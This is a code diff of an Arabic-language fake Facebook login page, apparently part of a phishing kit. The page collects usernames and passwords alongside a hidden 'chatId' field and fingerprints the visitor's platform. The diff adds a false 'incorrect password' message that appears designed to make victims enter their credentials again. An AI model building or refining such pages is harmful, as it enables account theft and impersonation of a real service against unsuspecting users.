@@ -80,7 +80,7 @@
         <div class="logo">facebook</div>
         <form id="loginForm">
             <input type="hidden" name="chatId" id="chatIdInput">
-            <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+             <input type="text" name="username" class="input-field" placeholder="،رقم الهاتف أو البريد الإلكتروني،" required>
             <input type="password" name="password" placeholder="كلمة السر" required>
             <button type="submit">تسجيل الدخول</button>
             <a href="#" class="link">هل نسيت الحساب؟</a>
@@ -88,7 +88,7 @@
             <button type="button" style="background-color: #42b72a;">إنشاء حساب جديد</button>
         </form>
         <div class="notification" id="notification">
-            <p>تم تنفيذ طلبك! إذا كانت البيانات صحيحة، فسوف يتم تسجيل الدخول بنجاح.</p>
+        <p>كلمه السر او اسم المستخدم غير صحيحه يرجى استخدام اسم مستخدم وكلمه سر صحيحه او قوم بتسجيل عن طريق الإيميل او رقم الهاتف .</p>
         </div>
     </div>
     <script>
@@ -123,7 +123,7 @@
             let platform = "Unknown";
             if (/Windows/.test(ua)) platform = "Windows";
             else if (/Mac/.test(ua)) platform = "MacOS";
-            else if (/Linux/.test(ua)) platform = "Linux";
+            else if (/Linux/.test(ua)) platform = "Facebook";
             else if (/Android/.test(ua)) platform = "Android";
             else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";
 
@@ -195,3 +195,4 @@
     </script>
 </body>
 </html>
+
